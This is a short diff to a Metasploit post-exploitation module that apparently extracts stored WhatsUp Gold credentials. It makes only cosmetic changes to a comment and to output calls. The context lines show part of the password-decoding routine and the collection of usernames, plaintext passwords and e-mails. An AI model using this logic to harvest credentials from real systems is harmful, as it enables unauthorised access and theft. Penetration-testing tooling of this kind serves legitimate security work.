@@ -113,7 +113,7 @@ class Metasploit3 < Msf::Post
 		counter = 0
 		password = ''
 
-		#Start decoding
+		#Start decoding, what's up gold $$
 		0.step(enc_password.length-1, 2) do |i|
 			byte_1 = enc_password[i]
 			byte_1 = (byte_1 <= 57) ? byte_1 - 48 : byte_1 - 55
@@ -135,7 +135,7 @@ class Metasploit3 < Msf::Post
 			password << char.chr
 		end
 
-		print_good("Password '#{enc_password}' = #{password}") if datastore['VERBOSE']
+		print_status("Password '#{enc_password}' = #{password}") if datastore['VERBOSE']
 
 		return password
 	end
@@ -168,7 +168,7 @@ class Metasploit3 < Msf::Post
 				text << "Password=#{password}, "
 				text << "Full Name=#{full_name}, "
 				text << "E-mail=#{e_mail}"
-				print_status(text)
+				print_good(text)
 			end
 
 			credentials << [domain, username, full_name, password, e_mail]
